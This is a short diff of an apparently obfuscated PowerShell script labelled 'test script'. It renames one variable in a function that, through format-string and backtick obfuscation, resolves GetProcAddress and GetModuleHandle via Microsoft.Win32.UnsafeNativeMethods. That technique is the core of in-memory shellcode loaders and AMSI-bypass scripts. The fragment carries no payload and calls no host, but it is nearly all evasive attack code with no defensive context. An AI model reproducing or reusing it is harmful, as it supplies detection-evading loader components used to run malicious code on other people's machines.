@@ -1,7 +1,7 @@
-# test script 2
-$qK78B  =  [TYPE]("{0}{2}{1}" -f 'APP','MaiN','dO'); function tasty {
+# test script 1234
+$abc1234  =  [TYPE]("{0}{2}{1}" -f 'APP','MaiN','dO'); function tasty {
 Param (${ChER`R`IES}, ${P`In`EAPpLE})
-${TO`MaTO`es} = ( $Qk78B::"CUr`Re`NTdOm`AiN".("{3}{0}{2}{1}" -f'e','mblies','tAsse','G').Invoke() | .("{0}{1}{2}" -f 'Whe','r','e-Object') { ${_}."Glo`BALAssEMb`l`ycaC`HE" -And ${_}."LO`Ca`TiON".("{0}{1}" -f'Spl','it').Invoke('\\')[-1].("{0}{1}"-f'E','quals').Invoke(("{2}{0}{1}" -f'ystem','.dll','S')) }).("{0}{1}" -f'Ge','tType').Invoke(("{6}{4}{0}{3}{7}{1}{2}{5}{8}{9}"-f'oso','s','afeNati','ft','icr','ve','M','.Win32.Un','Met','hods'))
+${TO`MaTO`es} = ( $Abc1234::"CUr`Re`NTdOm`AiN".("{3}{0}{2}{1}" -f'e','mblies','tAsse','G').Invoke() | .("{0}{1}{2}" -f 'Whe','r','e-Object') { ${_}."Glo`BALAssEMb`l`ycaC`HE" -And ${_}."LO`Ca`TiON".("{0}{1}" -f'Spl','it').Invoke('\\')[-1].("{0}{1}"-f'E','quals').Invoke(("{2}{0}{1}" -f'ystem','.dll','S')) }).("{0}{1}" -f'Ge','tType').Invoke(("{6}{4}{0}{3}{7}{1}{2}{5}{8}{9}"-f'oso','s','afeNati','ft','icr','ve','M','.Win32.Un','Met','hods'))
 ${TuRn`I`pS}=@()
 ${tom`A`TOEs}.("{0}{2}{1}{3}" -f'Ge','tho','tMe','ds').Invoke() | .("{2}{3}{1}{0}" -f'ject','b','Fo','rEach-O') {If(${_}."n`AME" -eq ("{0}{1}{3}{2}" -f'GetPr','oc','ess','Addr')) {${T`Urn`iPS}+=${_}}}
 return ${tU`Rni`PS}[0]."I`NV`OkE"(${nu`Ll}, @((${To`mat`oEs}.("{2}{0}{1}" -f 'tMeth','od','Ge').Invoke(("{0}{1}{2}{3}"-f 'G','etModuleHand','l','e')))."iNVo`kE"(${N`UlL}, @(${chE`RR`ies})), ${Pi`NEaPP`LE}))
